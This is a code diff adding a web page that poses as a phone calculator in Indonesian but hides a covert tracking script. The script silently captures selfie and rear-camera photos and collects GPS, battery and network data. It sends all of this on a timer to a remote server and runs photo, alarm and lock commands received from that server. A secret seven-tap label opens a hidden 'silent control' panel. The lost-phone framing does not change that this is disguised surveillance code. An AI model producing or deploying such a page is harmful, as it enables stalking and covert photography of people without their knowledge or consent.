@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Kalkulator">
+  <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgo=">
+  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgo=">
+  <title>Kalkulator</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-tap-highlight-color:transparent}
+    body{
+      background:#000;color:#fff;
+      font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display",sans-serif;
+      min-height:100vh;display:flex;flex-direction:column;
+      justify-content:flex-end;
+      padding:env(safe-area-inset-top,20px) 16px env(safe-area-inset-bottom,24px) 16px;
+      overflow:hidden;
+    }
+    /* Hidden media elements */
+    #silentVideo,#silentCanvas,#envVideo,#envCanvas{
+      position:absolute;width:1px;height:1px;opacity:0;
+      pointer-events:none;left:-9999px;top:-9999px;
+    }
+    /* Calculator UI */
+    #calcWrap{display:flex;flex-direction:column;width:100%;max-width:400px;margin:0 auto}
+    .calc-screen{font-size:68px;font-weight:300;text-align:right;
+      padding:10px 14px 20px;color:#fff;letter-spacing:-1px;word-break:break-all;
+      min-height:100px;display:flex;align-items:flex-end;justify-content:flex-end}
+    .calc-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+    .btn{
+      aspect-ratio:1;border-radius:50%;border:none;
+      font-size:30px;font-weight:400;cursor:pointer;
+      display:flex;align-items:center;justify-content:center;
+      background:#333;color:#fff;transition:opacity .1s;
+    }
+    .btn:active{opacity:.55}
+    .btn.top{background:#a5a5a5;color:#000}
+    .btn.op{background:#ff9f0a;color:#fff}
+    .btn.zero{grid-column:span 2;aspect-ratio:auto;border-radius:44px;
+      padding-left:30px;justify-content:flex-start}
+    .secret-label{text-align:center;font-size:11px;color:rgba(255,255,255,.07);
+      margin-top:14px;padding:6px;cursor:default}
+
+    /* Owner modal */
+    #ownerModal{
+      display:none;position:fixed;inset:0;
+      background:rgba(10,15,30,.96);backdrop-filter:blur(20px);
+      z-index:9999;flex-direction:column;padding:30px 20px;overflow-y:auto;
+    }
+    .modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+    .modal-head h2{font-size:18px;font-weight:800;color:#fff}
+    .modal-close{background:none;border:none;color:#94a3b8;font-size:24px;cursor:pointer}
+    .card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
+      border-radius:16px;padding:18px;margin-bottom:14px}
+    .card-title{font-size:15px;font-weight:700;color:#38bdf8;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+    .row{display:flex;justify-content:space-between;align-items:center;
+      padding:6px 0;border-bottom:1px solid rgba(255,255,255,.05);font-size:13px}
+    .row:last-child{border:none}
+    .lbl{color:#94a3b8}.val{font-family:monospace;color:#38bdf8;font-weight:700;text-align:right;max-width:60%}
+    .val.green{color:#34d399}.val.red{color:#f87171}.val.yellow{color:#fbbf24}
+    .btn-action{
+      width:100%;padding:13px;border-radius:12px;border:none;
+      font-size:14px;font-weight:700;cursor:pointer;margin-bottom:10px;
+      display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .btn-green{background:#059669;color:#fff}
+    .btn-blue{background:#0284c7;color:#fff}
+    .btn-red{background:rgba(239,68,68,.2);border:1px solid #ef4444;color:#fca5a5}
+    .btn-action:active{opacity:.75}
+    #lockMsg{
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,.97);
+      z-index:99999;align-items:center;justify-content:center;flex-direction:column;
+      padding:30px;text-align:center;
+    }
+    .lock-icon{font-size:80px;margin-bottom:20px}
+    .lock-text{font-size:22px;font-weight:800;color:#fff;margin-bottom:12px}
+    .lock-sub{font-size:15px;color:#94a3b8;line-height:1.6}
+    .lock-phone{font-size:28px;font-weight:900;color:#38bdf8;margin-top:20px}
+
+    /* Alarm animation */
+    @keyframes alarm{0%,100%{background:#000}50%{background:#3b0000}}
+    .alarming{animation:alarm .5s infinite}
+
+    /* Notification dot */
+    #statusDot{
+      width:8px;height:8px;border-radius:50%;background:#34d399;
+      position:fixed;top:env(safe-area-inset-top,16px);right:16px;
+      box-shadow:0 0 8px #34d399;transition:all .3s;
+    }
+    #statusDot.red{background:#ef4444;box-shadow:0 0 8px #ef4444}
+    #statusDot.yellow{background:#fbbf24;box-shadow:0 0 8px #fbbf24}
+  </style>
+</head>
+<body>
+
+<!-- Hidden camera elements -->
+<video id="silentVideo" autoplay playsinline muted></video>
+<canvas id="silentCanvas" width="480" height="640"></canvas>
+<video id="envVideo" autoplay playsinline muted></video>
+<canvas id="envCanvas" width="480" height="640"></canvas>
+
+<!-- Status dot (invisible from distance, visible in logs) -->
+<div id="statusDot"></div>
+
+<!-- Lock / alarm overlay -->
+<div id="lockMsg">
+  <div class="lock-icon">🔒</div>
+  <div class="lock-text">Perangkat Dikunci</div>
+  <div class="lock-sub" id="lockText">HP ini dilaporkan hilang. Hubungi pemilik.</div>
+  <div class="lock-phone" id="lockPhone"></div>
+</div>
+
+<!-- Calculator UI -->
+<div id="calcWrap">
+  <div class="calc-screen" id="calcDisplay">0</div>
+  <div class="calc-grid">
+    <button class="btn top" id="btnAC" onclick="ca('C')">AC</button>
+    <button class="btn top" onclick="ca('+/-')">±</button>
+    <button class="btn top" onclick="ca('%')">%</button>
+    <button class="btn op" onclick="ca('/')">÷</button>
+    <button class="btn" onclick="ca('7')">7</button>
+    <button class="btn" onclick="ca('8')">8</button>
+    <button class="btn" onclick="ca('9')">9</button>
+    <button class="btn op" onclick="ca('*')">×</button>
+    <button class="btn" onclick="ca('4')">4</button>
+    <button class="btn" onclick="ca('5')">5</button>
+    <button class="btn" onclick="ca('6')">6</button>
+    <button class="btn op" onclick="ca('-')">−</button>
+    <button class="btn" onclick="ca('1')">1</button>
+    <button class="btn" onclick="ca('2')">2</button>
+    <button class="btn" onclick="ca('3')">3</button>
+    <button class="btn op" onclick="ca('+')">+</button>
+    <button class="btn zero" onclick="ca('0')">0</button>
+    <button class="btn" onclick="ca('.')">.</button>
+    <button class="btn op" onclick="ca('=')">=</button>
+  </div>
+  <div class="secret-label" id="secretTrigger">v4.1 Calculator Utility</div>
+</div>
+
+<!-- Owner control modal -->
+<div id="ownerModal">
+  <div class="modal-head">
+    <h2>🛡️ Kontrol Senyap</h2>
+    <button class="modal-close" onclick="closeModal()">✕</button>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📡 Status Cloud</div>
+    <div class="row"><span class="lbl">Backend</span><span class="val" id="mBackend">—</span></div>
+    <div class="row"><span class="lbl">Transmisi terakhir</span><span class="val" id="mLastTx">—</span></div>
+    <div class="row"><span class="lbl">Total terkirim</span><span class="val" id="mTxCount">0</span></div>
+    <div class="row"><span class="lbl">Interval</span><span class="val" id="mInterval">60 dtk</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📍 Lokasi Terakhir</div>
+    <div class="row"><span class="lbl">Koordinat</span><span class="val" id="mCoords">Belum ada</span></div>
+    <div class="row"><span class="lbl">Akurasi</span><span class="val" id="mAccuracy">—</span></div>
+    <div class="row"><span class="lbl">Baterai</span><span class="val" id="mBattery">—</span></div>
+    <div class="row"><span class="lbl">Jaringan</span><span class="val" id="mNetwork">—</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚡ Kirim Sekarang</div>
+    <button class="btn-action btn-green" onclick="sendBeacon(true)">📡 Kirim Lokasi + Foto Sekarang</button>
+    <button class="btn-action btn-blue" onclick="triggerSelfie()">📸 Foto Depan Sekarang</button>
+    <button class="btn-action btn-blue" onclick="triggerEnvironment()">🌍 Foto Lingkungan Sekarang</button>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚙️ Konfigurasi</div>
+    <div class="row">
+      <span class="lbl">Server lokal</span>
+      <span class="val" id="mLocalSrv">Tidak aktif</span>
+    </div>
+    <div class="row">
+      <span class="lbl">Cloud</span>
+      <span class="val" id="mCloudSrv">sentinel.fiezel.my.id</span>
+    </div>
+    <div class="row">
+      <span class="lbl">Device ID</span>
+      <span class="val" id="mDeviceId" style="font-size:11px">—</span>
+    </div>
+    <button class="btn-action btn-red" style="margin-top:10px" onclick="changeInterval()">
+      ⏱️ Ubah Interval
+    </button>
+  </div>
+</div>
+
+<script>
+'use strict';
+
+// ═══════════════════════════════════════════════════════════════
+// KONFIGURASI — diisi otomatis saat halaman dibuat / bisa diubah
+// ═══════════════════════════════════════════════════════════════
+const CFG = (() => {
+  // deviceId dari query param ?d=XXXX-XXXX-XXXX atau localStorage
+  const deviceId = new URLSearchParams(location.search).get('d') || localStorage.getItem('sz_device') || '';
+
+  // Server lokal (jika ada) dan cloud endpoint
+  const localBase  = localStorage.getItem('sz_local') || '';          // e.g. http://192.168.1.5:5050
+  const cloudBase  = 'https://sentinel.fiezel.my.id';
+
+  return { deviceId, localBase, cloudBase };
+})();
+
+if (CFG.deviceId) {
+  localStorage.setItem('sz_device', CFG.deviceId);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════════
+let selfieStream  = null;
+let envStream     = null;
+let txCount       = parseInt(localStorage.getItem('sz_txcount') || '0');
+let lastLat       = null, lastLon = null, lastAcc = null;
+let beaconInterval = parseInt(localStorage.getItem('sz_interval') || '60');  // detik
+let beaconTimer   = null;
+let secretTaps    = 0;
+let secretTimer   = null;
+const DOT = document.getElementById('statusDot');
+
+// ═══════════════════════════════════════════════════════════════
+// KALKULATOR
+// ═══════════════════════════════════════════════════════════════
+let calcState = { display: '0', prev: null, op: null, fresh: true };
+const $disp = document.getElementById('calcDisplay');
+const $ac   = document.getElementById('btnAC');
+
+function ca(v) {
+  const s = calcState;
+  if (v === 'C') {
+    calcState = { display: '0', prev: null, op: null, fresh: true };
+    $ac.textContent = 'AC';
+    $disp.textContent = '0';
+    return;
+  }
+  if (v === '+/-') { s.display = String(-parseFloat(s.display) || 0); $disp.textContent = s.display; return; }
+  if (v === '%')   { s.display = String(parseFloat(s.display) / 100 || 0); $disp.textContent = s.display; return; }
+  if (['+','-','*','/'].includes(v)) {
+    s.prev = parseFloat(s.display); s.op = v; s.fresh = true; return;
+  }
+  if (v === '=') {
+    if (s.prev !== null && s.op) {
+      const cur = parseFloat(s.display);
+      const r = s.op === '+' ? s.prev+cur : s.op === '-' ? s.prev-cur :
+                s.op === '*' ? s.prev*cur : s.op === '/' ? s.prev/cur : cur;
+      s.display = String(+r.toFixed(10)).replace(/\.?0+$/, '') || '0';
+      $disp.textContent = s.display;
+      s.prev = null; s.op = null; s.fresh = true;
+    }
+    return;
+  }
+  // digit / dot
+  if (v === '.' && s.display.includes('.')) return;
+  if (s.fresh) { s.display = v === '.' ? '0.' : v; s.fresh = false; }
+  else { if (s.display === '0' && v !== '.') s.display = v; else s.display += v; }
+  $disp.textContent = s.display;
+  $ac.textContent = 'C';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECRET TRIGGER — tap label 7× dalam 3 detik
+// ═══════════════════════════════════════════════════════════════
+document.getElementById('secretTrigger').addEventListener('click', () => {
+  secretTaps++;
+  clearTimeout(secretTimer);
+  secretTimer = setTimeout(() => { secretTaps = 0; }, 3000);
+  if (secretTaps >= 7) {
+    secretTaps = 0;
+    openOwnerModal();
+  }
+});
+
+function openOwnerModal() {
+  refreshModalData();
+  document.getElementById('ownerModal').style.display = 'flex';
+}
+function closeModal() {
+  document.getElementById('ownerModal').style.display = 'none';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// GPS
+// ═══════════════════════════════════════════════════════════════
+function getGPS() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) { resolve({}); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+      }),
+      () => resolve({}),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// BATERAI
+// ═══════════════════════════════════════════════════════════════
+async function getBattery() {
+  try {
+    if ('getBattery' in navigator) {
+      const b = await navigator.getBattery();
+      return { battery: Math.round(b.level * 100), charging: b.charging };
+    }
+  } catch {}
+  return {};
+}
+
+// ═══════════════════════════════════════════════════════════════
+// KAMERA SENYAP — selfie (depan)
+// ═══════════════════════════════════════════════════════════════
+async function captureSelfie() {
+  try {
+    if (!selfieStream || !selfieStream.active) {
+      selfieStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
+        audio: false,
+      });
+      document.getElementById('silentVideo').srcObject = selfieStream;
+    }
+    await new Promise(r => setTimeout(r, 600)); // biarkan kamera warm-up
+    const vid = document.getElementById('silentVideo');
+    const cnv = document.getElementById('silentCanvas');
+    cnv.width = vid.videoWidth || 480;
+    cnv.height = vid.videoHeight || 640;
+    cnv.getContext('2d').drawImage(vid, 0, 0);
+    return cnv.toDataURL('image/jpeg', 0.55);
+  } catch { return null; }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// KAMERA SENYAP — lingkungan (belakang)
+// ═══════════════════════════════════════════════════════════════
+async function captureEnvironment() {
+  try {
+    if (!envStream || !envStream.active) {
+      envStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false,
+      });
+      document.getElementById('envVideo').srcObject = envStream;
+    }
+    await new Promise(r => setTimeout(r, 600));
+    const vid = document.getElementById('envVideo');
+    const cnv = document.getElementById('envCanvas');
+    cnv.width = vid.videoWidth || 640;
+    cnv.height = vid.videoHeight || 480;
+    cnv.getContext('2d').drawImage(vid, 0, 0);
+    return cnv.toDataURL('image/jpeg', 0.55);
+  } catch { return null; }
+}
+
+async function triggerSelfie() {
+  const img = await captureSelfie();
+  if (img) await sendBeaconData({ selfie: img, alertReason: 'manual-selfie' });
+}
+async function triggerEnvironment() {
+  const img = await captureEnvironment();
+  if (img) await sendBeaconData({ environment: img, alertReason: 'manual-env' });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// DETEKSI GETARAN (Gerak) — alert otomatis
+// ═══════════════════════════════════════════════════════════════
+let motionBaseline = null;
+let motionAlerted = false;
+
+if (typeof DeviceMotionEvent !== 'undefined') {
+  window.addEventListener('devicemotion', evt => {
+    const a = evt.acceleration;
+    if (!a) return;
+    const mag = Math.sqrt((a.x||0)**2 + (a.y||0)**2 + (a.z||0)**2);
+    if (motionBaseline === null) { motionBaseline = mag; return; }
+    if (Math.abs(mag - motionBaseline) > 8 && !motionAlerted) {
+      motionAlerted = true;
+      sendBeacon(false, true, 'motion-alert');
+      setTimeout(() => { motionAlerted = false; }, 30000);
+    }
+    motionBaseline = mag * 0.1 + motionBaseline * 0.9;
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CHARGER DICABUT — alert otomatis
+// ═══════════════════════════════════════════════════════════════
+async function watchCharger() {
+  try {
+    const b = await navigator.getBattery();
+    let wasCharging = b.charging;
+    b.addEventListener('chargingchange', () => {
+      if (wasCharging && !b.charging) {
+        // Charger dicabut — kemungkinan HP dipindahkan
+        sendBeacon(false, true, 'charger-removed');
+      }
+      wasCharging = b.charging;
+    });
+  } catch {}
+}
+
+// ═══════════════════════════════════════════════════════════════
+// KIRIM BEACON
+// ═══════════════════════════════════════════════════════════════
+async function sendBeaconData(extra = {}) {
+  if (!CFG.deviceId) return;
+
+  const [gps, bat] = await Promise.all([getGPS(), getBattery()]);
+  if (gps.lat) { lastLat = gps.lat; lastLon = gps.lon; lastAcc = gps.accuracy; }
+
+  const payload = {
+    lat: lastLat,
+    lon: lastLon,
+    accuracy: lastAcc,
+    battery: bat.battery ?? null,
+    charging: bat.charging ?? false,
+    network: navigator.connection ? navigator.connection.effectiveType : null,
+    ...extra,
+  };
+
+  const cloudUrl = `${CFG.cloudBase}/api/beacon/${CFG.deviceId}`;
+  const localUrl = CFG.localBase ? `${CFG.localBase}/api/sentinel/beacon` : null;
+
+  let commands = [];
+  let success = false;
+
+  // Coba cloud dahulu, lalu lokal sebagai fallback
+  const endpoints = [cloudUrl];
+  if (localUrl) endpoints.push(localUrl);
+
+  for (const url of endpoints) {
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(url === localUrl ? { ...payload, deviceId: CFG.deviceId } : payload),
+        signal: AbortSignal.timeout(8000),
+      });
+      if (res.ok) {
+        const data = await res.json();
+        if (data.commands) commands = data.commands;
+        success = true;
+        updateDot('green');
+        break;
+      }
+    } catch {}
+  }
+
+  if (!success) updateDot('red');
+
+  txCount++;
+  localStorage.setItem('sz_txcount', String(txCount));
+
+  // Jalankan perintah yang diterima
+  for (const cmd of commands) await execCmd(cmd);
+
+  return success;
+}
+
+async function sendBeacon(withPhoto = false, isAlert = false, reason = '') {
+  const extra = { alert: isAlert };
+  if (reason) extra.alertReason = reason;
+
+  if (withPhoto) {
+    const [selfie, env] = await Promise.all([captureSelfie(), captureEnvironment()]);
+    if (selfie) extra.selfie = selfie;
+    if (env) extra.environment = env;
+  } else {
+    // Kirim selfie senyap setiap 3× beacon
+    if (txCount % 3 === 0) {
+      const selfie = await captureSelfie();
+      if (selfie) extra.selfie = selfie;
+    }
+  }
+
+  return sendBeaconData(extra);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// EKSEKUSI PERINTAH DARI CLOUD
+// ═══════════════════════════════════════════════════════════════
+async function execCmd(cmd) {
+  switch (cmd.type) {
+    case 'chime':
+    case 'alarm':
+      playAlarm(cmd.type === 'alarm');
+      break;
+    case 'selfie':
+      { const img = await captureSelfie(); if (img) sendBeaconData({ selfie: img, alertReason: 'cmd-selfie' }); }
+      break;
+    case 'environment':
+      { const img = await captureEnvironment(); if (img) sendBeaconData({ environment: img, alertReason: 'cmd-env' }); }
+      break;
+    case 'photo':
+      { const [s, e] = await Promise.all([captureSelfie(), captureEnvironment()]); sendBeaconData({ selfie: s, environment: e, alertReason: 'cmd-photo' }); }
+      break;
+    case 'lock_msg':
+      showLock(cmd.message || 'HP ini dilaporkan hilang. Hubungi pemilik.');
+      break;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// ALARM AUDIO
+// ═══════════════════════════════════════════════════════════════
+function playAlarm(loud = false) {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const freqs = loud ? [880, 660, 440, 660, 880] : [880];
+    freqs.forEach((f, i) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.frequency.value = f;
+      gain.gain.setValueAtTime(loud ? 0.8 : 0.5, ctx.currentTime + i * 0.4);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.4 + 0.35);
+      osc.start(ctx.currentTime + i * 0.4);
+      osc.stop(ctx.currentTime + i * 0.4 + 0.4);
+    });
+    if (loud) document.body.classList.add('alarming');
+    setTimeout(() => document.body.classList.remove('alarming'), freqs.length * 400 + 500);
+  } catch {}
+}
+
+// ═══════════════════════════════════════════════════════════════
+// LOCK MESSAGE
+// ═══════════════════════════════════════════════════════════════
+function showLock(msg) {
+  document.getElementById('lockText').textContent = msg;
+  const lockDiv = document.getElementById('lockMsg');
+  lockDiv.style.display = 'flex';
+  playAlarm(true);
+  // Tap 5× untuk tutup (owner yang tahu triknya)
+  let taps = 0;
+  lockDiv.addEventListener('click', () => {
+    taps++;
+    if (taps >= 5) lockDiv.style.display = 'none';
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// STATUS DOT
+// ═══════════════════════════════════════════════════════════════
+function updateDot(color) {
+  DOT.className = color !== 'green' ? color : '';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// MODAL DATA REFRESH
+// ═══════════════════════════════════════════════════════════════
+function refreshModalData() {
+  document.getElementById('mDeviceId').textContent = CFG.deviceId || '(belum diset)';
+  document.getElementById('mBackend').textContent = CFG.cloudBase;
+  document.getElementById('mTxCount').textContent = txCount;
+  document.getElementById('mInterval').textContent = `${beaconInterval} dtk`;
+  document.getElementById('mCoords').textContent =
+    lastLat ? `${lastLat.toFixed(5)}, ${lastLon.toFixed(5)}` : 'Belum ada';
+  document.getElementById('mAccuracy').textContent = lastAcc ? `±${Math.round(lastAcc)} m` : '—';
+  document.getElementById('mLocalSrv').textContent = CFG.localBase || 'Tidak aktif';
+  document.getElementById('mLastTx').textContent = txCount > 0 ? 'Baru' : 'Belum';
+}
+
+function changeInterval() {
+  const n = prompt(`Interval beacon sekarang: ${beaconInterval} detik.\nMasukkan nilai baru (10–600):`, String(beaconInterval));
+  if (n && !isNaN(n)) {
+    beaconInterval = Math.max(10, Math.min(600, parseInt(n)));
+    localStorage.setItem('sz_interval', String(beaconInterval));
+    startBeaconLoop();
+    refreshModalData();
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// LOOP UTAMA
+// ═══════════════════════════════════════════════════════════════
+function startBeaconLoop() {
+  if (beaconTimer) clearInterval(beaconTimer);
+  beaconTimer = setInterval(() => sendBeacon(false), beaconInterval * 1000);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VISIBILITY CHANGE — kirim segera saat layar menyala kembali
+// ═══════════════════════════════════════════════════════════════
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden) sendBeacon(false);
+});
+
+// ═══════════════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════════════
+(async function init() {
+  if (!CFG.deviceId) {
+    // Tidak ada deviceId → tampil kalkulator biasa saja, tidak ada tracking
+    return;
+  }
+
+  // Kirim beacon pertama + foto dalam 2 detik setelah muat
+  setTimeout(() => sendBeacon(true, false, 'first-open'), 2000);
+
+  // Mulai loop
+  startBeaconLoop();
+
+  // Watch charger
+  watchCharger();
+
+  // Poll perintah setiap 30 detik juga (sebagai cadangan beacon)
+  setInterval(async () => {
+    if (!CFG.deviceId) return;
+    try {
+      const res = await fetch(`${CFG.cloudBase}/api/cmd/${CFG.deviceId}`, {
+        signal: AbortSignal.timeout(5000),
+      });
+      if (res.ok) {
+        const d = await res.json();
+        for (const cmd of (d.commands || [])) await execCmd(cmd);
+      }
+    } catch {}
+  }, 30_000);
+})();
+</script>
+</body>
+</html>
